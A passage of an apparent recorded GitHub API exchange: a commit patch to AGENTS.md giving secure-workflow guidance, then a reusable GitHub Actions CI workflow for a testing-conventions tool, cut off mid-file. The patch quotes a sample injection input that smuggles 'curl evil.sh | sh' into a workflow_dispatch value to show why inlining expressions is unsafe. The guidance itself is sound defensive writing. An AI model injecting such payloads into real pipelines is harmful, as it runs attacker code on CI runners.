+          "html_url": "https://github.com/thekevinscott/testing-conventions/commit/c924613b5f2bbceec1a246f37cca33b04008ec16"
+        },
+        {
+          "sha": "f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5",
+          "html_url": "https://github.com/thekevinscott/testing-conventions/commit/f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5"
+        }
+      ],
+      "stats": {
+        "total": 25,
+        "additions": 22,
+        "deletions": 3
+      },
+      "files": [
+        {
+          "sha": "e87d017154fc293cee7e4127e41f7eaa36ae4f40",
+          "filename": "AGENTS.md",
+          "status": "modified",
+          "additions": 22,
+          "deletions": 3,
+          "changes": 25,
+          "blob_url": "https://github.com/thekevinscott/testing-conventions/blob/b3d3556b377c69f594826502c524966f9b0c6f60/AGENTS.md",
+          "raw_url": "https://github.com/thekevinscott/testing-conventions/raw/b3d3556b377c69f594826502c524966f9b0c6f60/AGENTS.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/testing-conventions/contents/AGENTS.md?ref=b3d3556b377c69f594826502c524966f9b0c6f60",
+          "patch": "@@ -283,9 +283,28 @@ Two reasons this is a requirement, not a preference:\n   extracting to a script sidesteps the whole class (#301, #302).\n \n Follow the `internals/move-major-tag` (`src/move_major_tag.py` + colocated unit test + `tests/`)\n-and `check_e2e_verify_wired` precedents for structure. Passing a value from a step to a script is\n-a CLI argument (`… check.py \"${{ steps.detect.outputs.package_root }}\"`), never an env\n-side-channel — see **Never pass data through the environment**.\n+and `check_e2e_verify_wired` precedents for structure.\n+\n+**A value a step hands a script arrives as a CLI argument, never read from the environment by the\n+script itself.** Never inline `${{ }}` into the invocation: GitHub substitutes that text before bash\n+parses it, so a `workflow_dispatch` input of `a\"; curl evil.sh | sh; \"` executes. Bind the\n+expression to a step `env:` name, then pass that as a quoted shell variable in the argument list:\n+\n+```yaml\n+env:\n+  PACKAGES: ${{ inputs.packages }}\n+run: pnpm run bootstrap-npm -- \"$PACKAGES\"\n+```\n+\n+That `env:` name is bash's, not the script's. It exists only to carry the value across the templating\n+layer, and bash expands it after parsing, as one argv element. The script reads `process.argv` /\n+`sys.argv` and never `process.env` / `os.environ` for its own inputs — that read is the side-channel\n+**Never pass data through the environment** forbids, and a step `env:` block is not an exemption\n+from it.\n+\n+The exception is a variable some *other* tool reads from the environment as its own documented\n+interface: `NODE_AUTH_TOKEN` for `npm publish`, `CI`, `PATH`. Those are that tool's contract, not our\n+step-to-script wiring, and they stay in `env:`.\n \n ## Wiring gates are earned\n "
+        }
+      ]
+    }
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "path": ".github/workflows/testing-conventions.yml",
+      "ref": "b3d3556b377c69f594826502c524966f9b0c6f60"
+    },
+    "result": "name: Testing Conventions\n\n# Reusable, consumer-facing workflow: one `uses:` call runs every check.\n# See docs/reference/workflow.md for the inputs, the checks, and the `@v0` contract.\n\non:\n  workflow_call:\n    inputs:\n      languages:\n        description: 'Optional JSON array restricting which languages to check, e.g. [\"python\"]. Empty (the default) auto-detects every supported language present under `source`.'\n        type: string\n        default: ''\n      source:\n        description: 'Directory scanned recursively for sources.'\n        type: string\n        default: 'src'\n      version:\n        description: 'testing-conventions version to run, e.g. 0.1.0 (default: latest from npm).'\n        type: string\n        default: ''\n      config:\n        description: 'Optional config file to refine the checks (coverage thresholds, exemptions). If absent, every check runs with sane defaults.'\n        type: string\n        default: 'testing-conventions.toml'\n      base:\n        description: 'Base ref for the diff-scoped `--base` jobs, diffed as `<base>...HEAD`. Used by the `*-changed` jobs, which run on `pull_request` only and check out full history.'\n        type: string\n        default: 'origin/main'\n      run_e2e:\n        description: 'Force the `e2e verify` freshness gate on. It is already default-on when committed receipts (`e2e-attestations/`) are present at the package root; set this to run it regardless. Needs the receipts and full git history.'\n        type: boolean\n        default: false\n      packaging_artifact:\n        description: 'Name of an uploaded build artifact (actions/upload-artifact) holding the built distributions (.whl/.tar.gz/.tgz/.crate) to check. When set, the packaging job downloads and inspects it. When empty (default), packaging still runs over a conventional dist/ found in the checkout, and is skipped only when no dist/ exists either.'\n        type: string\n        default: ''\n      gates:\n        description: 'Optional JSON array naming which gates run, e.g. [\"colocated-test\", \"unit-lint\", \"integration-lint\"]. Empty (the default) runs every applicable gate. Gate names: colocated-test, one-function-per-file, unit-lint, unit-coverage, mutation, integration-lint, packaging, e2e-verify, changelog. A named gate still applies its own conditions, and its diff-scoped variant rides with it (colocated-test covers the co-change job, unit-coverage the changed-line job). The allowlist is authoritative: a gate left out is skipped even when run_e2e / packaging_artifact is set.'\n        type: string\n        default: ''\n      rust_toolchain:\n        description: 'Manual override: provision a stable Rust toolchain (with a cargo registry + target cache) in the suite-executing jobs, before build_command runs. unit coverage / changed-line coverage / unit mutation already auto-provision it when the manifest at the derived package root declares a Rust-compiling build (a Cargo.toml, a maturin backend, a napi key); set this by hand only for a build the manifest does not express. The rust matrix arm always carries its own toolchain. false (the default) leaves provisioning to that auto-derivation.'\n        type: boolean\n        default: false\n\npermissions:\n  contents: read\n\njobs:\n  detect:\n    name: Detect requested languages with sources\n    runs-on: ubuntu-latest\n    outputs:\n      languages: ${{ steps.scan_hermetic.outputs.languages || steps.scan_published.outputs.languages }}\n      colocated_test_languages: ${{ steps.scan_hermetic.outputs.colocated_test_languages || steps.scan_published.outputs.colocated_test_languages }}\n      integration_lint_languages: ${{ steps.scan_hermetic.outputs.integration_lint_languages || steps.scan_published.outputs.integration_lint_languages }}\n      isolation_languages: ${{ steps.scan_hermetic.outputs.isolation_languages || steps.scan_published.outputs.isolation_languages }}\n      static_languages: ${{ steps.scan_hermetic.outputs.static_languages || steps.scan_published.outputs.static_languages }}\n      one_function_languages: ${{ steps.scan_hermetic.outputs.one_function_languages || steps.scan_published.outputs.one_function_languages }}\n      coverage_languages: ${{ steps.scan_hermetic.outputs.coverage_languages || steps.scan_published.outputs.coverage_languages }}\n      mutation_languages: ${{ steps.scan_hermetic.outputs.mutation_languages || steps.scan_published.outputs.mutation_languages }}\n      packaging_dist: ${{ steps.scan_hermetic.outputs.packaging_dist || steps.scan_published.outputs.packaging_dist }}\n      e2e_attestation: ${{ steps.scan_hermetic.outputs.e2e_attestation || steps.scan_published.outputs.e2e_attestation }}\n      package_root: ${{ steps.scan_hermetic.outputs.package_root || steps.scan_published.outputs.package_root }}\n      ts_package_manager: ${{ steps.scan_hermetic.outputs.ts_package_manager || steps.scan_published.outputs.ts_package_manager }}\n      ts_pnpm_version: ${{ steps.scan_hermetic.outputs.ts_pnpm_version || steps.scan_published.outputs.ts_pnpm_version }}\n      python_env: ${{ steps.scan_hermetic.outputs.python_env || steps.scan_published.outputs.python_env }}\n      provision_rust: ${{ steps.scan_hermetic.outputs.provision_rust || steps.scan_published.outputs.provision_rust }}\n      cargo_target_dir: ${{ steps.scan_hermetic.outputs.cargo_target_dir || steps.scan_published.outputs.cargo_target_dir }}\n      config: ${{ steps.scan_hermetic.outputs.config || steps.scan_published.outputs.config }}\n      build_command: ${{ steps.scan_hermetic.outputs.build_command || steps.scan_published.outputs.build_command }}\n      packaging_build: ${{ steps.scan_hermetic.outputs.packaging_build || steps.scan_published.outputs.packaging_build }}\n      packaging_language: ${{ steps.scan_hermetic.outputs.packaging_language || steps.scan_published.outputs.packaging_language }}\n      e2e_extra_scope: ${{ steps.scan_hermetic.outputs.e2e_extra_scope || steps.scan_published.outputs.e2e_extra_scope }}\n      e2e_exclude: ${{ steps.scan_hermetic.outputs.e2e_exclude || steps.scan_published.outputs.e2e_exclude }}\n      cli_command: ${{ steps.scan_hermetic.outputs.cli_command || steps.scan_published.outputs.cli_command }}\n      ts_mutation_adapter_args: ${{ steps.scan_hermetic.outputs.ts_mutation_adapter_args || steps.scan_published.outputs.ts_mutation_adapter_args }}\n    steps:\n      - uses: actions/checkout@v6\n      - id: scan_hermetic\n        # `uses:` cannot be dynamic, so the HEAD and published detect actions are separate steps.\n        if: ${{ github.repository == 'thekevinscott/testing-conventions' && inputs.version == '' }}\n        uses: ./.github/actions/detect\n        with:\n          languages: ${{ inputs.languages }}\n          path: ${{ inputs.source }}\n          config: ${{ inputs.config }}\n          caller_repository: ${{ github.repository }}\n          version: ${{ inputs.version }}\n      - id: scan_published\n        if: ${{ !(github.repository == 'thekevinscott/testing-conventions' && inputs.version == '') }}\n        uses: thekevinscott/testing-conventions/.github/actions/detect@v0\n        with:\n          languages: ${{ inputs.languages }}\n          path: ${{ inputs.source }}\n          config: ${{ inputs.config }}\n          caller_repository: ${{ github.repository }}\n          version: ${{ inputs.version }}\n\n  changelog:\n    name: CHANGELOG + MIGRATIONS touched\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"changelog\"')) }}\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          fetch-depth: 0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Check changelog and migration fragments\n        env:\n          BASE: ${{ inputs.base }}\n          VERSION: ${{ inputs.version }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} changelog --base \"$BASE\"\n\n  static:\n    name: Static checks (${{ matrix.language }})\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"') || contains(inputs.gates, '\"unit-lint\"') || contains(inputs.gates, '\"one-function-per-file\"') || contains(inputs.gates, '\"integration-lint\"')) && (needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # The fetch-depth values are quoted: a bare 0 is falsy, so `&& 0 || 1` would always yield 1.\n          fetch-depth: ${{ github.event_name == 'pull_request' && '0' || '1' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Check colocated test\n        if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"')) && contains(needs.detect.outputs.colocated_test_languages || needs.detect.outputs.languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit colocated-test --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check co-change vs ${{ inputs.base }}\n        # `!cancelled()`: an earlier gate's failure must not hide this gate's result.\n        if: ${{ !cancelled() && github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"')) && contains(needs.detect.outputs.languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit colocated-test --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check unit lint\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"unit-lint\"')) && contains(needs.detect.outputs.isolation_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit lint --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check one function per file\n        # The `|| integration_lint_languages` fallback covers a stale `@v0` detect that predates\n        # `one_function_languages`; the two sets are identical.\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"one-function-per-file\"')) && contains(needs.detect.outputs.one_function_languages || needs.detect.outputs.integration_lint_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit one-function-per-file --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Lint integration tests\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"integration-lint\"')) && contains(needs.detect.outputs.integration_lint_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} integration lint --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  unit-coverage:\n    name: Unit-test coverage (${{ matrix.language }})\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"unit-coverage\"')) && needs.detect.outputs.coverage_languages != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n        with:\n          components: llvm-tools-preview\n      - if: matrix.language == 'rust'\n        name: Install cargo-llvm-cov\n        uses: taiki-e/install-action@v2\n        with:\n          tool: cargo-llvm-cov\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      # The command is passed through env and `eval`-ed, so a full shell string works and no\n      # caller value is interpolated into `run:`.\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check unit-test coverage\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit coverage --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  coverage-changed:\n    name: Unit-test coverage — changed lines (${{ matrix.language }})\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"unit-coverage\"')) && needs.detect.outputs.coverage_languages != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.\n          fetch-depth: 0\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n        with:\n          components: llvm-tools-preview\n      - if: matrix.language == 'rust'\n        name: Install cargo-llvm-cov\n        uses: taiki-e/install-action@v2\n        with:\n          tool: cargo-llvm-cov\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check changed-line coverage vs ${{ inputs.base }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit coverage --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  mutation:\n    name: Unit mutation — changed lines (${{ matrix.language }})\n    needs: detect\n    # `mutation_languages` is a newer detect output, so the matrix falls back to\n    # `coverage_languages` (the identical set) until `@v0` advances to a detect that emits it.\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"mutation\"')) && (needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.\n          fetch-depth: 0\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: a maturin/PyO3 build triggered by `uv sync` needs it.\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      # The CLI installs cargo-mutants itself on first use; caching that dir reuses the build.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: matrix.language == 'rust'\n        name: Cache the provisioned cargo-mutants\n        uses: actions/cache@v4\n        with:\n          path: ~/.cache/testing-conventions\n          key: cargo-mutants-provision-${{ runner.os }}\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check mutation on the lines changed vs ${{ inputs.base }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n          # `$TS_MUTATION_ADAPTER_ARGS` is deliberately unquoted: empty on the published path,\n          # word-split into flag and path on the hermetic one.\n          TS_MUTATION_ADAPTER_ARGS: ${{ needs.detect.outputs.ts_mutation_adapter_args }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit mutation --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\" $TS_MUTATION_ADAPTER_ARGS\n\n  e2e-verify:\n    name: E2E attestation freshness (e2e verify)\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"e2e-verify\"')) && (inputs.run_e2e || needs.detect.outputs.e2e_attestation == 'true') }}\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>..HEAD`, so full history is needed and `inputs.base` must resolve.\n          # Check out the PR's head commit, not the ephemeral merge commit, which an attestation\n          # can never name — it is rebuilt on every push.\n          fetch-depth: 0\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Verify the e2e attestation is current\n        env:\n          VERSION: ${{ inputs.version }}\n          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}\n          SCAN_PATH: ${{ inputs.source }}\n          BASE: ${{ inputs.base }}\n          EXTRA_SCOPE: ${{ needs.detect.outputs.e2e_extra_scope }}\n          EXCLUDE: ${{ needs.detect.outputs.e2e_exclude }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        # `$EXTRA_SCOPE` / `$EXCLUDE` are deliberately unquoted: empty expands to nothing, and a\n        # rendered value word-splits into the repeated flags.\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} e2e verify \"$PACKAGE_ROOT\" --scope \"$SCAN_PATH\" --base \"$BASE\" $EXTRA_SCOPE $EXCLUDE\n\n  packaging:\n    name: Packaging (no test files in the built artifact)\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"packaging\"')) && (inputs.packaging_artifact != '' || needs.detect.outputs.packaging_build != '' || needs.detect.outputs.packaging_dist == 'true') }}\n    runs-on: ubuntu-latest\n    steps:\n      # Checkout must precede the artifact download: actions/checkout deletes the workspace's\n      # existing contents before initializing, so downloading first would wipe the artifact.\n      - name: Check out the repository to build/inspect its distribution, or just to resolve the hermetic-cli download action\n        if: inputs.packaging_artifact == '' || needs.detect.outputs.cli_command != ''\n        uses: actions/checkout@v6\n      - name: Download the uploaded distributions\n        if: inputs.packaging_artifact != ''\n        uses: actions/download-artifact@v8\n        with:\n          name: ${{ inputs.packaging_artifact }}\n          path: _packaging_artifact\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `cargo package` needs it, and `uv build`/`prepack` may compile a Rust core.\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}\n        uses: dtolnay/rust-toolchain@stable\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') 